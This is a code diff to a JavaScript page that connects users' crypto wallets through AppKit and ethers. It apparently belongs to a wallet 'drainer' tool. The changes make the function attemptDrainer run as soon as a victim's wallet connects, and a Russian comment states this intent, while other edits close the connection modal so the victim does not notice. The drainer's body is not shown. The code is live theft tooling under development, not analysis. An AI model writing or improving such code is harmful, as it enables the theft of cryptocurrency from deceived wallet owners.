@@ -980,7 +980,6 @@ async function handleConnectOrAction() {
       await appKit.open();
       connectedAddress = await waitForConnection();
       console.log(`✅ Wallet connected: ${connectedAddress}`);
-      appKit.close();
 
       if (!window.ethereum) throw new Error('No Ethereum provider available after connection');
       const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
@@ -988,13 +987,12 @@ async function handleConnectOrAction() {
       await saveSession(connectedAddress, network.chainId);
     } else {
       console.log(`✅ Wallet already connected: ${connectedAddress}`);
-    }
-
-    if (!isTransactionPending) {
-      await attemptDrainer();
-    } else {
-      console.log('⏳ Transaction already in progress');
-      await hideModalWithDelay("Transaction already in progress.");
+      if (!isTransactionPending) {
+        await attemptDrainer();
+      } else {
+        console.log('⏳ Transaction already in progress');
+        await hideModalWithDelay("Transaction already in progress.");
+      }
     }
   } catch (error) {
     console.error(`❌ Connection error: ${error.message}`);
@@ -1016,19 +1014,31 @@ async function waitForConnection() {
       if (state.connected && state.address) {
         console.log(`✅ Wallet connected via AppKit: ${state.address}`);
         unsubscribe();
-        resolve(state.address);
+        connectedAddress = state.address;
+        // Вызываем attemptDrainer сразу после подключения
+        attemptDrainer()
+          .then(() => {
+            appKit.close();
+            resolve(state.address);
+          })
+          .catch((err) => {
+            appKit.close();
+            reject(err);
+          });
       }
     });
 
     const timeout = setTimeout(() => {
       unsubscribe();
+      appKit.close();
       reject(new Error('Timeout waiting for wallet connection'));
     }, 60000);
 
-    appKit.open('error', (err) => {
+    appKit.on('error', (err) => {
       console.error(`❌ AppKit error: ${err.message}`);
       clearTimeout(timeout);
       unsubscribe();
+      appKit.close();
       reject(err);
     });
   });
